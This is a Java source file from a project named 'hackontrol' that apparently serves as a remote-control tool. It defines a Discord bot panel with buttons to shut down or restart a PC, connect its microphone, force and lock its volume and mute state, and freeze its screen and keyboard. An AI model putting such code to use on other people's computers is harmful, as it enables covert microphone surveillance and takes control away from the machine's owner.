package com.khopan.hackontrol.panel;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.handler.KeyboardHandler;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.nativelibrary.Kernel;
import com.khopan.hackontrol.nativelibrary.User;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.Microphone;
import com.khopan.hackontrol.widget.ControlWidget;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class ControlPanel extends Panel {
	private static final String PANEL_NAME = "control";

	private static final Button BUTTON_SLEEP                 = ButtonManager.staticButton(ButtonType.SECONDARY, "Sleep",      "sleep");
	private static final Button BUTTON_HIBERNATE             = ButtonManager.staticButton(ButtonType.SUCCESS,   "Hibernate",  "hibernate");
	private static final Button BUTTON_RESTART               = ButtonManager.staticButton(ButtonType.PRIMARY,   "Restart",    "restart");
	private static final Button BUTTON_SHUTDOWN              = ButtonManager.staticButton(ButtonType.DANGER,    "Shutdown",   "shutdown");

	private static final Button BUTTON_VOLUME                = ButtonManager.staticButton(ButtonType.SUCCESS,   "Volume",     "changeVolume");

	private static final Button BUTTON_MICROPHONE_CONNECT    = ButtonManager.staticButton(ButtonType.SUCCESS,   "Connect",    "connectMicrophone");
	private static final Button BUTTON_MICROPHONE_DISCONNECT = ButtonManager.staticButton(ButtonType.DANGER,    "Disconnect", "disconnectMicrophone");

	private static final Button BUTTON_MUTE                  = ButtonManager.staticButton(ButtonType.SUCCESS,   "Mute",       "volumeMute");
	private static final Button BUTTON_UNMUTE                = ButtonManager.staticButton(ButtonType.DANGER,    "Unmute",     "volumeUnmute");

	private static final Button BUTTON_FORCE                 = ButtonManager.staticButton(ButtonType.SUCCESS,   "Force",      "volumeForce");
	private static final Button BUTTON_UNFORCE               = ButtonManager.staticButton(ButtonType.DANGER,    "Unforce",    "volumeUnforce");

	private static final Button BUTTON_SCREEN_FREEZE         = ButtonManager.staticButton(ButtonType.SUCCESS,   "Freeze",     "screenFreeze");
	private static final Button BUTTON_SCREEN_UNFREEZE       = ButtonManager.staticButton(ButtonType.DANGER,    "Unfreeze",   "screenUnfreeze");

	private final Microphone microphone;

	private volatile float volume;
	private volatile boolean mute;
	private volatile boolean forceMode;

	public ControlPanel() {
		this.microphone = new Microphone();
	}

	@Override
	public String panelName() {
		return ControlPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SLEEP,                 context -> Question.positive(context.reply(), "Are you sure you want to sleep?",     QuestionType.YES_NO, Kernel :: sleep));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_HIBERNATE,             context -> Question.positive(context.reply(), "Are you sure you want to hibernate?", QuestionType.YES_NO, Kernel :: hibernate));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_RESTART,               context -> Question.positive(context.reply(), "Are you sure you want to restart?",   QuestionType.YES_NO, Kernel :: restart));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SHUTDOWN,              context -> Question.positive(context.reply(), "Are you sure you want to shutdown?",  QuestionType.YES_NO, Kernel :: shutdown));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_VOLUME,                context -> {});
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_CONNECT,    this.microphone :: connect);
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MICROPHONE_DISCONNECT, this.microphone :: disconnect);
		this.register(Registration.BUTTON, ControlPanel.BUTTON_MUTE,                  context -> this.buttonMute(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNMUTE,                context -> this.buttonMute(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_FORCE,                 context -> this.buttonForceMode(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_UNFORCE,               context -> this.buttonForceMode(context, false));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_FREEZE,         context -> this.buttonFreeze(context, true));
		this.register(Registration.BUTTON, ControlPanel.BUTTON_SCREEN_UNFREEZE,       context -> this.buttonFreeze(context, false));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.text("**Power**")
				.actionRow(ControlPanel.BUTTON_SLEEP, ControlPanel.BUTTON_HIBERNATE, ControlPanel.BUTTON_RESTART, ControlPanel.BUTTON_SHUTDOWN)
				.build(),
				ControlWidget.newBuilder()
				.text("**Sound**")
				.actionRow(ControlPanel.BUTTON_VOLUME)
				.actionRow(ControlPanel.BUTTON_MICROPHONE_CONNECT, ControlPanel.BUTTON_MICROPHONE_DISCONNECT)
				.actionRow(ControlPanel.BUTTON_MUTE, ControlPanel.BUTTON_UNMUTE)
				.actionRow(ControlPanel.BUTTON_FORCE, ControlPanel.BUTTON_UNFORCE)
				.build(),
				ControlWidget.newBuilder()
				.text("**Screen**")
				.actionRow(ControlPanel.BUTTON_SCREEN_FREEZE, ControlPanel.BUTTON_SCREEN_UNFREEZE)
				.build()
		};
	}

	@Override
	public void initialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
			if(!this.forceMode) {
				return;
			}

			if(User.getMasterVolume() != this.volume) {
				User.setMasterVolume(this.volume);
			}

			if(User.isMute() != this.mute) {
				User.setMute(this.mute);
			}
		}, 0, 1000 / 60, TimeUnit.MILLISECONDS);
	}

	private void buttonMute(ButtonContext context, boolean mute) {
		if((this.forceMode ? this.mute : User.isMute()) == mute) {
			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
			return;
		}

		if(!mute) {
			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
				if(this.forceMode) {
					this.mute = false;
				} else {
					User.setMute(false);
				}
			});

			return;
		}

		if(this.forceMode) {
			this.mute = true;
		} else {
			User.setMute(true);
		}

		context.deferEdit().queue();
	}

	private void buttonForceMode(ButtonContext context, boolean enable) {
		if(this.forceMode == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
			return;
		}

		this.volume = User.getMasterVolume();
		this.mute = User.isMute();
		this.forceMode = true;
		context.deferEdit().queue();
	}

	private void buttonFreeze(ButtonContext context, boolean freeze) {
		if(KeyboardHandler.Freeze == freeze) {
			HackontrolMessage.boldDeletable(context.reply(), "The screen is already " + (freeze ? "frozen" : "unfrozen"));
			return;
		}

		if(!freeze) {
			Question.positive(context.reply(), "Are you sure you want to unfreeze the screen?", QuestionType.YES_NO, () -> this.freeze(false));
			return;
		}

		this.freeze(true);
		context.deferEdit().queue();
	}

	private void freeze(boolean freeze) {
		KeyboardHandler.Freeze = freeze;
		Kernel.setFreeze(freeze);
	}
}
